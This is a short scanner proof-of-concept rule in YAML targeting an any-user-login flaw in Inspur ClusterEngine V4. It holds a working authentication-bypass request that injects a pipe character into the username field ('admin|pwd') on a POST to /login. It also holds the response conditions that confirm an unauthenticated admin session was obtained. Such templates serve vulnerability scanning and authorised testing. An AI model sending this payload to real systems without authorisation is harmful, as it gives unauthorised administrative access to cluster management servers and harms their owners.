name: poc-yaml-inspur-clusterengine-v4-any-user-login
rules:
  - method: POST
    path: /login
    body: op=login&username=admin|pwd&password=123456
    follow_redirects: true
    expression: |
      response.status == 200 && response.body.bcontains(b"\"exitcode\":0") && response.headers["Set-Cookie"].contains("username=admin|pwd")
